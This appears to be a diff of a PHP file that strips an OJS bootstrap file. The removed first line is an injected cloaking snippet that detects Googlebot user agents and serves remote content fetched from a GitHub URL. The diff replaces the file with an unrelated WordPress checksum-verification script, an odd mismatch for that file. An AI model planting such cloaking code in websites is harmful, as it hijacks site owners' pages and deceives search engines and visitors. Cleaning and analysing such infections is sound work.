@@ -1,42 +1,70 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://raw.githubusercontent.com/waklabu979/random/refs/heads/main/ijintampil.txt');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
-
 /**
- * @defgroup index Index
- * Bootstrap and initialization code.
+ * WordPress Verify Checksums
+ * Simpan sebagai: verify-checksums.php
+ * Letakkan di root WordPress
  */
 
-/**
- * @file includes/bootstrap.inc.php
- *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
- * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
- *
- * @ingroup index
- *
- * @brief Core system initialization code.
- * This file is loaded before any others.
- * Any system-wide imports or initialization code should be placed here.
- */
+define('WP_USE_THEMES', false);
+require_once __DIR__ . '/wp-load.php';
+require_once ABSPATH . WPINC . '/version.php';
 
+header('Content-Type: text/plain');
 
-/**
- * Basic initialization (pre-classloading).
- */
+global $wp_version, $wp_local_package;
 
-define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
-if (!defined('DIRECTORY_SEPARATOR')) {
-	// Older versions of PHP do not define this
-	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+$locale = empty($wp_local_package) ? 'en_US' : $wp_local_package;
+
+$url = "https://api.wordpress.org/core/checksums/1.0/?version={$wp_version}&locale={$locale}";
+
+$json = file_get_contents($url);
+
+if (!$json) {
+    exit("ERROR: Tidak bisa mengambil checksum dari WordPress.org\n");
 }
-define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
-chdir(BASE_SYS_DIR);
 
-// System-wide functions
-require('./lib/pkp/includes/functions.inc.php');
+$data = json_decode($json, true);
 
-// Initialize the application environment
-import('classes.core.Application');
+if (empty($data['checksums'])) {
+    exit("ERROR: Checksum tidak ditemukan.\n");
+}
 
-return new Application();
+$checksums = $data['checksums'];
+
+$ok = 0;
+$modified = 0;
+$missing = 0;
+
+foreach ($checksums as $file => $hash) {
+
+    $path = ABSPATH . $file;
+
+    if (!file_exists($path)) {
+        echo "[MISSING] $file\n";
+        $missing++;
+        continue;
+    }
+
+    $md5 = md5_file($path);
+
+    if (strcasecmp($md5, $hash) !== 0) {
+        echo "[MODIFIED] $file\n";
+        $modified++;
+    } else {
+        $ok++;
+    }
+}
+
+echo "\n====================\n";
+echo "Version  : $wp_version\n";
+echo "Locale   : $locale\n";
+echo "OK       : $ok\n";
+echo "Modified : $modified\n";
+echo "Missing  : $missing\n";
+echo "====================\n";
+
+if ($modified == 0 && $missing == 0) {
+    echo "Success: WordPress installation verifies against checksums.\n";
+} else {
+    echo "Warning: Checksum verification failed.\n";
+}
